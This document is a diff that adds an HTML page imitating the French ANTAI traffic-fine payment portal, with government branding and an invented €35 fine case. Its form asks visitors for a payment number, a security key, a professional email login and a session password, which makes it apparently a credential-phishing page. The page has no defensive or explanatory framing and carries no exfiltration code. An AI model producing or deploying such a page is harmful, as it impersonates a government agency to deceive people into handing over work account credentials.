@@ -1,0 +1,60 @@
+<!DOCTYPE html><html lang="fr"><head>
+    <meta charset="UTF-8"/>
+    <title>Paiement des amendes en ligne - Gouv.fr</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
+        .header { background-color: #fff; border-bottom: 2px solid #0053b3; padding: 10px 20px; display: flex; align-items: center; }
+        .logo-rf { border-left: 3px solid #000; padding-left: 10px; font-weight: bold; font-size: 14px; text-transform: uppercase; line-height: 1; }
+        .container { max-width: 800px; margin: 40px auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #0053b3; font-size: 22px; }
+        .info-box { background-color: #e7f2ff; border-left: 5px solid #0053b3; padding: 15px; margin-bottom: 25px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 3px; box-sizing: border-box; }
+        .btn-submit { background-color: #0053b3; color: white; padding: 12px 20px; border: none; border-radius: 3px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
+        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 50px; padding-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo-rf">République<br/>Française</div>
+        <div style="margin-left: 20px; font-weight: bold; color: #555;">ANTAI</div>
+    </div>
+
+    <div class="container">
+        <h1>Paiement de votre amende forfaitaire</h1>
+        
+        <div class="info-box">
+            <strong>Dossier N° ANTAI-2026-99102-FR</strong><br/>
+            Montant à régler : 35,00 € (Tarif normal)
+        </div>
+
+        <p>Veuillez confirmer votre identité pour accéder au module de paiement sécurisé.</p>
+
+        <form action="" method="post">
+            <div class="form-group">
+                <label>Numéro de télépaiement</label>
+                <input type="text" required="" placeholder="12 chiffres indiqués sur votre avis"/>
+            </div>
+            <div class="form-group">
+                <label>Clé de sécurité</label>
+                <input type="text" required="" placeholder="2 chiffres"/>
+            </div>
+            <div class="form-group">
+                <label>Identifiant de connexion (Email professionnel)</label>
+                <input type="text" required=""/>
+            </div>
+            <div class="form-group">
+                <label>Mot de passe session</label>
+                <input type="password" required="" name="password"/>
+            </div>
+            <button type="submit" class="btn-submit">ACCÉDER AU PAIEMENT</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        © 2026 - ANTAI - Agence Nationale de Traitement Automatisé des Infractions<br/>
+        <a href="#">Mentions légales</a> | <a href="#">Sécurité</a>
+    </div>
+
+</body></html>
